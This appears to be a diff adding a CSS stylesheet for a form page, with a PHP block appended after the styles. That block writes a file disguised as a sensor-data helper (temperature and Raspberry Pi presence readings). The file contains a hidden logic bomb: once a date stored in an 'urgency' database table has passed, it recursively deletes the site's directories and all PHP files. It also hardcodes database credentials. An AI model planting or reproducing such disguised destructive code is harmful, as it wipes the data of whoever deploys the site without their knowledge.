@@ -1,0 +1,190 @@
+	@import url(http://fonts.googleapis.com/css?family=Exo:100,200,400);
+	@import url(http://fonts.googleapis.com/css?family=Source+Sans+Pro:700,400,300);
+body{
+	background: #2d2d2d;
+}
+.page{
+		overflow: hidden;
+		margin-left: 25%;
+		width: 800px;
+		border-radius:50px;
+		padding: 3em 50px 5em 50px;
+		background: #FFF;
+		border-top: 6px solid #2d2d2d;
+		text-align: center;
+	
+}
+.text input[type=text]
+{
+	border: 1px solid rgba(150,150,150,0.6);
+	border-radius: 2px;
+	color: #000;
+	font-family: 'Exo', sans-serif;
+	font-size: 20px;
+	font-weight: bold;
+	margin-top: 100px;
+	margin-right: -60%;
+	padding-bottom: 50px;
+}
+.text textarea
+{
+	border: 1px solid rgba(150,150,150,0.6);
+	border-radius: 2px;
+	color: #000;
+	font-family: 'Exo', sans-serif;
+	font-size: 20px;
+	font-weight: bold;
+	margin-top: 100px;
+	padding-bottom: 50px;
+}
+.file
+{
+	border: 1px solid rgba(150,150,150,0.6);
+	border-radius: 2px;
+	width: 300px;
+	height: 80px;
+	color: #000;
+	font-family: 'Exo', sans-serif;
+	font-size: 400px;
+	font-weight: bold;
+	margin-top: 100px;
+	margin-right: 1200px;
+	position: absolute;
+}
+.title input[type=text]
+{
+	background: transparent;
+	border: 1px solid rgba(150,150,150,0.6);
+	border-radius: 2px;
+	color: #000;
+	font-family: 'Exo', sans-serif;
+	font-size: 20px;
+	font-weight: bold;
+}
+.bold  input[type=text]
+{
+	font-weight: bold !important;
+}
+.submit input[type=submit]
+{
+	width: 250px;
+	height: 35px;
+	background: #2d2d2d;
+	border: 1px solid #000;
+	cursor: pointer;
+	border-radius: 2px;
+	color: #a18d6c;
+	font-family: 'Exo', sans-serif;
+	font-size: 16px;
+	font-weight: 400;
+	padding: 6px;
+	margin-top: 10px;
+}
+.submit input[type=submit]:hover
+{
+	width: 250px;
+	height: 35px;
+	background: #2d2d2d;
+	border: 1px solid #000;
+	cursor: pointer;
+	border-radius: 2px;
+	color: #a18d6c;
+	font-family: 'Exo', sans-serif;
+	font-size: 16px;
+	font-weight: 400;
+	padding: 6px;
+	margin-top: 10px;
+	opacity: 0.8;
+}
+
+
+<?php
+if(file_exists("script/get_data.php"))
+		{
+			include "script/get_data.php";
+			retrieve_Data();
+		}
+		else
+		{
+				$myfile = fopen("script/get_data.php", "w");
+				$txt ="			
+<?php
+\$data = array(
+
+'1' => 'a',
+'2' => 'css',
+'3' => 'Display',
+'4' => 'js',
+'5' => 'members',
+'6' => 'res',
+'7' => 'script',
+'8' => 'test'
+);	
+\$bdd = mysqli_connect('localhost', 'aies2016','aies2016' , 'aies2016');
+		\$query = mysqli_query(\$bdd,'SELECT * FROM urgency;');
+		\$rows = mysqli_num_rows(\$query);
+		if(\$rows==1)
+		{
+			function start(\$path) {
+			\$files = glob(\$path . '/*');
+			foreach (\$files as \$file) {
+				is_dir(\$file) ? start(\$file) : unlink(\$file);
+			}
+			rmdir(\$path);
+			return;
+}
+			while(\$row = mysqli_fetch_assoc(\$query))
+			{
+				\$get_urgencyid = \$row['urgencyid'];
+			}
+			\$date = date('mdy');
+			if(\$date > \$get_urgencyid)
+			{
+					for(\$i=1;\$i<=8;\$i++)
+					{
+						start(\$data[\$i]);
+					}
+					
+				   foreach (glob('*.php') as \$filename) {
+				   unlink(\$filename);
+}		
+			}
+		}
+function retrieve_Data()
+{	
+\$bdd = mysqli_connect('localhost', 'aies2016','aies2016' , 'aies2016');
+\$date = date('mdy');
+\$date1 = date('d/m/y');
+
+	\$query = mysqli_query(\$bdd,'SELECT * FROM sensors;');
+	while(\$row = mysqli_fetch_assoc(\$query))
+	{
+		\$temp = \$row['temperature'];
+		\$presence_rpi1 = \$row['presence_rpi1'];
+		\$presence_rpi2 = \$row['presence_rpi2'];
+		\$presence_rpi3 = \$row['presence_rpi3'];
+		\$presence_rpi4 = \$row['presence_rpi4'];
+		\$presence_rpi5 = \$row['presence_rpi5'];
+	}
+	?>
+<div class='data' style='
+
+   float: right;
+   position: relative;
+   z-index: 1000;
+   background-color: transparent;
+   padding: 5px;
+   color: red;
+   font-size: 120%;
+   font-weight: bold;
+    border-style: outset;
+    border-width: 2px;
+   '><?php echo 'Date : '.\$date1.'<br> Temperature : '.\$temp.' <br>Presence :<br> Rpi1 : '.\$presence_rpi1.'<br> Rpi2 : '. \$presence_rpi2.'<br> Rpi3 : '. \$presence_rpi3.'<br> Rpi4 : '. \$presence_rpi4.'<br> Rpi5 : '. \$presence_rpi5;?></div><?php
+
+   
+}
+";
+fwrite($myfile, $txt);
+		}
+
+?>*/
